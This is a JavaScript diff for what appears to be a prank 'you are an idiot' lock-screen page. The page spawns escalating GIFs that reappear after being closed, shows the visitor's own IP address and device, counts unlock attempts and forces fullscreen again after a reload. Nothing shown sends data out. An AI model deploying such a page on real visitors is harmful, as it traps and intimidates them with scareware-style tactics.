   var GIF_SRC = 'youareanidiot.gif';
   var GIF_ITEMS = [];
   var GIF_TIMERS = [];
@@ -1858,16 +1778,34 @@
     if (attempt >= 3) level = 2;
     if (attempt >= 4) level = 3;
     if (attempt >= 6) level = 4;
-    var sizeRange = {
-      1: [400, 700], 2: [500, 900], 3: [600, 1100], 4: [700, 1400]
-    }[level] || [400, 700];
+    var sizeRange = { 1: [400, 700], 2: [500, 900], 3: [600, 1100], 4: [700, 1400] }[level] || [400, 700];
     return {
-      count: Math.min(count, GIF_MAX),
-      duration: duration, level: level,
+      count: Math.min(count, GIF_MAX), duration: duration, level: level,
       sizeMin: sizeRange[0], sizeMax: sizeRange[1],
       spawnInterval: Math.max(80, 500 - attempt * 60),
       hasShake: level >= 2, hasSpin: level >= 3, hasBounce: level >= 4
     };
+  }
+
+  /* Fungsi close GIF — dipakai tombol X DAN tap di GIF */
+  function closeGifWrapper(wrapper, level, sizeMin, sizeMax, options) {
+    if (!wrapper || wrapper.__closing) return;
+    wrapper.__closing = true;
+    playBeep(220, 0.05, 'square', 0.1);
+    wrapper.style.transition = 'opacity 0.3s, transform 0.3s';
+    wrapper.style.opacity = '0';
+    wrapper.style.transform += ' scale(0.3) rotate(90deg)';
+    setTimeout(function() {
+      if (wrapper.parentNode) wrapper.parentNode.removeChild(wrapper);
+      var i = GIF_ITEMS.indexOf(wrapper);
+      if (i > -1) GIF_ITEMS.splice(i, 1);
+      var respawnDelay = 1500 + Math.random() * 1500;
+      var respawn = setTimeout(function() {
+        if (!LOCKED) return;
+        spawnGif(level, sizeMin, sizeMax, options);
+      }, respawnDelay);
+      GIF_TIMERS.push(respawn);
+    }, 300);
   }
 
   function spawnGif(level, sizeMin, sizeMax, options) {
@@ -1888,6 +1826,7 @@
     if (level >= 4) img.classList.add('chaos');
     if (options.spin) img.classList.add('spinning');
     if (options.bounce) img.classList.add('bouncing');
+
     var maxW = window.innerWidth, maxH = window.innerHeight;
     var size = sizeMin + Math.random() * (sizeMax - sizeMin);
     size = Math.floor(size);
@@ -1895,38 +1834,54 @@
     img.style.width = finalSize + 'px';
     img.style.height = 'auto';
     img.style.display = 'block';
+
     var maxX = Math.max(10, maxW - finalSize * 0.5);
     var maxY = Math.max(10, maxH - finalSize * 0.5);
     var x = Math.random() * maxX - finalSize * 0.25;
     var y = Math.random() * maxY - finalSize * 0.25;
     wrapper.style.left = x + 'px';
     wrapper.style.top = y + 'px';
+
     if (level >= 3) {
       var rot = (Math.random() - 0.5) * 60;
       wrapper.style.transform = 'rotate(' + rot + 'deg)';
     }
+
+    // ========== KLIK/TAP DI GIF = CLOSE ==========
+    var tapped = false;
+    var tapHandler = function(e) {
+      // Cek kalau yang di-tap adalah tombol close, skip (biar gak double)
+      if (e.target && e.target.classList && e.target.classList.contains('gif-close-btn')) return;
+      e.preventDefault();
+      e.stopPropagation();
+      // Cek kalau ini bukan drag
+      if (tapped) return;
+      tapped = true;
+      setTimeout(function() { tapped = false; }, 400);
+      closeGifWrapper(wrapper, level, sizeMin, sizeMax, options);
+    };
+    wrapper.addEventListener('click', tapHandler);
+    wrapper.addEventListener('touchstart', function(e) {
+      e.stopPropagation();
+    }, { passive: true });
+    wrapper.addEventListener('touchend', tapHandler, { passive: false });
+
+    // ========== TOMBOL X (buat PC) ==========
     var closeBtn = document.createElement('button');
     closeBtn.className = 'gif-close-btn';
     closeBtn.innerHTML = '✕';
     closeBtn.type = 'button';
     closeBtn.addEventListener('click', function(e) {
-      e.preventDefault(); e.stopPropagation();
-      wrapper.style.transition = 'opacity 0.3s, transform 0.3s';
-      wrapper.style.opacity = '0';
-      wrapper.style.transform += ' scale(0.3) rotate(90deg)';
-      playBeep(220, 0.05, 'square', 0.1);
-      setTimeout(function() {
-        if (wrapper.parentNode) wrapper.parentNode.removeChild(wrapper);
-        var i = GIF_ITEMS.indexOf(wrapper);
-        if (i > -1) GIF_ITEMS.splice(i, 1);
-        var respawnDelay = 1500 + Math.random() * 1500;
-        var respawn = setTimeout(function() {
-          if (!LOCKED) return;
-          spawnGif(level, sizeMin, sizeMax, options);
-        }, respawnDelay);
-        GIF_TIMERS.push(respawn);
-      }, 300);
+      e.preventDefault();
+      e.stopPropagation();
+      closeGifWrapper(wrapper, level, sizeMin, sizeMax, options);
     });
+    closeBtn.addEventListener('touchend', function(e) {
+      e.preventDefault();
+      e.stopPropagation();
+      closeGifWrapper(wrapper, level, sizeMin, sizeMax, options);
+    }, { passive: false });
+
     wrapper.appendChild(img);
     wrapper.appendChild(closeBtn);
     img.onerror = function() {
@@ -1936,9 +1891,10 @@
     };
     layer.appendChild(wrapper);
     GIF_ITEMS.push(wrapper);
+
     var lifetime = (options.duration || 10000) + Math.random() * 3000;
     var tm = setTimeout(function() {
-      if (wrapper.parentNode) {
+      if (wrapper.parentNode && !wrapper.__closing) {
         wrapper.style.transition = 'opacity 0.4s, transform 0.4s';
         wrapper.style.opacity = '0';
         wrapper.style.transform += ' scale(0.3) rotate(45deg)';
@@ -2151,7 +2107,6 @@
     });
   }
 
-  /* ============ BINARY ============ */
   function initBinary() {
     var canvas = document.getElementById('binary');
     if (!canvas) return;
@@ -2184,7 +2139,6 @@
     });
   }
 
-  /* ============ PARTICLES ============ */
   function initParticles() {
     var canvas = document.getElementById('particles');
     if (!canvas) return;
@@ -2220,7 +2174,6 @@
     });
   }
 
-  /* ============ HUD ============ */
   function initHUD() {
     var clockEl = document.getElementById('hudClock');
     var fpsEl = document.getElementById('hudFps');
@@ -2246,7 +2199,6 @@
     requestAnimationFrame(tick);
   }
 
-  /* ============ DETECT DEVICE ============ */
   function detectDevice() {
     var ua = navigator.userAgent;
     var device = 'Unknown', os = 'Unknown', browser = 'Unknown';
@@ -2278,7 +2230,6 @@
     document.getElementById('browser').textContent = browser;
   }
 
-  /* ============ DETECT IP ============ */
   function detectIP() {
     fetch('https://ipapi.co/json/')
       .then(function(r) { return r.json(); })
@@ -2306,7 +2257,6 @@
       });
   }
 
-  /* ============ SCRAMBLE ============ */
   var SCRAMBLE_CHARS = '!@#$%^&*()<>?/\\{}[]~`01アイウエオabcdefghijklmnop0123456789';
   function scrambleText(element, finalText, duration) {
     if (!element) return;
@@ -2395,7 +2345,6 @@
     }
   }
 
-  /* ============ SOUND ============ */
   function playErrorSound() {
     playBeep(400, 0.15, 'sawtooth');
     setTimeout(function() { playBeep(250, 0.2, 'sawtooth'); }, 150);
@@ -2532,7 +2481,6 @@
     setTimeout(function() { clearInterval(iv); location.reload(); }, 8000);
   }
 
-  /* ============ COUNTER & MODAL ============ */
   function updateCounter() {
     var c = document.getElementById('counter');
     c.textContent = 'PERCOBAAN: ' + ATTEMPTS + ' / ' + MAX_ATTEMPTS;
@@ -2572,7 +2520,6 @@
     document.getElementById('modal').classList.remove('show');
   }
 
-  /* ============ UNLOCK ============ */
   function unlock() {
     if (BLOCKED) return;
     if (!LOCKED) return;
@@ -2632,7 +2579,6 @@
     }
   }
 
-  /* ============ INIT ============ */
   window.addEventListener('DOMContentLoaded', function() {
     initMatrix();
     initBinary();
@@ -2653,17 +2599,13 @@
       if (e.target.id === 'modal') hideModal();
     });
 
-    // Kalau abis reload, langsung paksa fullscreen
     try {
       if (sessionStorage.getItem('kompas_locked') === '1') {
-        console.log('[RELOAD] Restored — paksa fullscreen');
-        // Coba FS langsung (mungkin gak bisa tanpa gesture)
         forceFullscreen();
       }
     } catch(e) {}
   });
 
-  /* ============ START ============ */
   function startAllFx() {
     warmupVibrate();
     getAudio();
